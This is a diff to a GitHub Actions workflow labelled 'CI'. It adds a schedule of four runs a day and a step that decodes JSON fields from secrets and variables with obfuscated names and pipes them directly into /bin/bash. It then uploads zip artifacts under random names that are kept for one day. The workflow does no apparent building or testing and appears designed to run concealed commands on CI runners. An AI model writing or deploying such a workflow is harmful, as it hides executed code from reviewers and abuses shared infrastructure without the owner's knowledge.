@@ -2,6 +2,8 @@ name: CI
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '22 1,7,13,19 * * *'
 permissions:
   contents: read
 concurrency:
@@ -18,17 +20,16 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          po42877: ${{ secrets.po42877 }}
+          raqz9: ${{ secrets.raqz9 }}
         run: |
-          printf '%s' "$po42877" | jq -r .avqwf72 | /bin/bash
-          echo $glw2592 | jq -r .s3 | /bin/bash
-          printf '%s' "$echui8" | jq -r .rt86 | /bin/bash
-          echo $jjox85 | jq -r .gn59 | /bin/bash
+          printf '%s' "$raqz9" | jq -r .kuu179 | /bin/bash
+          echo $rg3695 | jq -r .jr8 | /bin/bash
+          echo $bfyky5 | jq -r .y8704 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: awx5KiSX
+          name: ZsxHVLR5
           path: "*.zip"
           retention-days: 1
